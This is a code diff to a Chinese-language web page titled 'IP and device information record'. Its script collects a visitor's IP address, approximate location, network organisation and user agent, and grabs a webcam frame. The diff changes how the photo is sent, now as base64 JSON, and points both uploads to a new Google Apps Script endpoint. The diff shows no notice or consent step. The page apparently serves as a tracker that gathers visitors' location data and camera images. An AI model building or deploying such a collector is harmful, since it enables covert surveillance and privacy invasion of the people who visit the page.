@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊息cc記d錄</h1>
+  <h1>IP 與設備訊息cc記cccccd錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycby7I8ZyvnGNS1r0sCTgRmZP755jlRjrYhrVQs9Yw4oIEbIxja2VfWncipWUPaI3LXtU6w/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbw2m4p-2ENkwNg8qq1pU9UnCrtmF94rz9qoKLYDIuVCqI3_tN9r4wfWEc2kuo7mTtT6Hg/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -63,34 +63,37 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       // 壓縮圖片大小並上傳
+      // 壓縮並轉換圖片為 Base64
       canvas.toBlob(async (blob) => {
-        try {
-          // 壓縮圖片
-          const compressedBlob = await compressImage(blob);
+        const compressedBlob = await compressImage(blob);
+        const reader = new FileReader();
       
-          // 建立 FormData
-          const formData = new FormData();
-          formData.append('photo', compressedBlob, 'photo.jpg');
+        reader.onloadend = async () => {
+          const base64Photo = reader.result.split(',')[1]; // 去掉 Base64 前綴
       
-          // 發送圖片到後端
-          const response = await fetch('https://script.google.com/macros/s/AKfycby7I8ZyvnGNS1r0sCTgRmZP755jlRjrYhrVQs9Yw4oIEbIxja2VfWncipWUPaI3LXtU6w/exec', {
+          // 發送 Base64 圖片至後端
+          const response = await fetch('https://script.google.com/macros/s/AKfycbw2m4p-2ENkwNg8qq1pU9UnCrtmF94rz9qoKLYDIuVCqI3_tN9r4wfWEc2kuo7mTtT6Hg/exec', {
             method: 'POST',
-            body: formData,
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              photo: base64Photo, // 將圖片數據作為 Base64 字符串發送
+              userAgent: navigator.userAgent,
+            }),
           });
       
           const result = await response.json();
           if (result.success) {
-            console.log('照片上傳成功: ', result.photoUrl);
             document.getElementById('status').innerText = '照片成功上傳！';
           } else {
-            console.error('照片上傳失敗: ', result.error);
             document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
           }
-        } catch (error) {
-          console.error('圖片上傳失敗: ', error);
-          document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
-        }
-      }, 'image/jpeg', 0.8);
+        };
+      
+        reader.readAsDataURL(compressedBlob); // 讀取 Blob 為 Base64
+      }, 'image/jpeg');
+
 
     }
 
